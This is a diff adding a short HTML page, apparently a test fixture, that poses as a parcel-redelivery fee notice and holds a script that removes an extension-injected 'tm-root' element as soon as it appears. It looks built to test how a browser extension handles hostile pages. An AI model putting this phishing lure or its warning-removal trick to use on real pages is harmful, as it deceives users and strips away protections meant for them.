@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Parcel update</title></head>
+<body>
+  <p>Your package is on hold at our depot. Pay the small redelivery fee to release it.</p>
+  <script>
+    // Removes the extension's element once, as soon as it appears.
+    window.__removed = 0;
+    new MutationObserver(() => {
+      const host = document.querySelector("tm-root");
+      if (host && window.__removed === 0) {
+        window.__removed = 1;
+        host.remove();
+      }
+    }).observe(document.documentElement, { childList: true, subtree: true });
+  </script>
+</body>
+</html>
